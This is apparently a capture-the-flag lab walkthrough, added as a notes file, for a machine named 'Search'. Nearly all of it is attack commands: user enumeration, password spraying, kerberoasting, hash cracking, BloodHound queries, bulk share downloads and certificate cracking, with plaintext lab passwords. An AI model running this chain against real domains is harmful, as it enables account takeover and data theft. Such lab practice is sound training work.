@@ -1,0 +1,95 @@
+# Search
+
+# Port Enum
+nmap -sC -sV 10.129.202.72 -o search-nmap.txt
+
+# Modify Host File for Kerberos Authentication
+
+sudo subl /etc/hosts
+
+## Gobuster 
+
+gobuster dir -u https://10.129.202.72 -w /usr/share/wordlists/dirb/common.txt -k
+
+# User Enum 
+Find in Web Browser 
+
+cat users.txt | grep -v "Image\|Manager" | grep .
+
+# Create User List with namemash.py
+
+https://gist.github.com/superkojiman/11076951
+python3 namemash.py users.txt > userlist.txt
+
+# Use CrackMapExec to Enum valid users 
+
+crackmapexec smb 10.129.202.72 -u ../userlist.txt -p '' --kerberos | tee output.txt
+
+cat output.txt | grep KDC_ERR_PREAUTH | cut -d '\' -f2 | cut -d ":" -f1 > search-users.txt
+
+# Password Spraying
+crackmapexec smb 10.129.202.72 -u search-users.txt -p IsolationIsKey? --kerberos
+
+# Kerberoasting 
+
+crackmapexec ldap 10.129.202.72 -u hope.sharp -p IsolationIsKey? --kerberoasting kerberoasting.out
+crackmapexec ldap 10.129.202.72 -u hope.sharp -p IsolationIsKey? --asreproast asreproast.out
+
+hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt --show
+
+# Get all Users
+
+crackmapexec smb 10.129.202.72 -u hope.sharp -p IsolationIsKey? --users | tee search-userlist.txt
+cat search-userlist.txt | cut -d '\' -f 2| cut -d ' ' -f1 > search_users.txt
+
+# Password Spraying
+crackmapexec smb 10.129.202.72 -u search_users.txt -p IsolationIsKey? --continue-on-success | tee sucess1.txt
+crackmapexec smb 10.129.202.72 -u search_users.txt -p @3ONEmillionbaby --continue-on-success | tee sucess2.txt
+
+cat success2.txt | grep "+"
+
+# File Shares 
+crackmapexec smb 10.129.202.72 -u hope.sharp -p IsolationIsKey? --kerberos --shares
+
+# BloodHound 
+
+python3 bloodhound.py -u hope.sharp -p IsolationIsKey? -ns 10.129.202.72 -d search.htb -c All
+[14:43]
+# Shares 
+
+crackmapexec smb 10.129.202.72 -u hope.sharp -p IsolationIsKey? --kerberos --shares
+
+## Patterns
+
+crackmapexec smb 10.129.202.72 -u hope.sharp -p IsolationIsKey? --spider RedirectedFolders$ --pattern txt
+
+## Regex 
+
+crackmapexec smb 10.129.202.72 -u hope.sharp -p IsolationIsKey? --spider RedirectedFolders$ --regex '\.(txt|docx?|xlsx?|pptx?|pdf|png|jpg|gif|bmp|mp3|wav|mp4|avi)$'
+
+crackmapexec smb 10.129.202.72 -u Edgar.Jacobs -p @3ONEmillionbaby --spider RedirectedFolders$ --regex '\.(txt|docx?|xlsx?|pptx?|pdf|png|jpg|gif|bmp|mp3|wav|mp4|avi)$'
+
+## Download ALL
+
+crackmapexec smb 10.129.202.72 -u Edgar.Jacobs -p @3ONEmillionbaby -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL,CertEnroll,helpdesk READ_ONLY=false
+
+## Phish Users & Passwords
+
+crackmapexec smb 10.129.202.72 -u  -p  --continue-on-success | tee phish.txt
+
+## BloodHound 
+
+MATCH p = allshortestPaths((n)-[*1..]->(c)) 
+WHERE n.name =~ '(?i)peter.*' AND NOT c=n 
+RETURN p
+
+## Download all siera files 
+
+crackmapexec smb 10.129.202.72 -u Sierra.Frye -p $$49=wide=STRAIGHT=jordan=28$$18 -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL,CertEnroll,helpdesk READ_ONLY=false
+
+## Crack the Certiricate
+
+wget https://raw.githubusercontent.com/sirrushoo/python/master/pfx2john.py
+python2 pfx2john.py sierra.frye/Downloads/Backups/staff.pfx > staff.hash
+
+john staff.hash --wordlist=/usr/share/wordlists/rockyou.txt
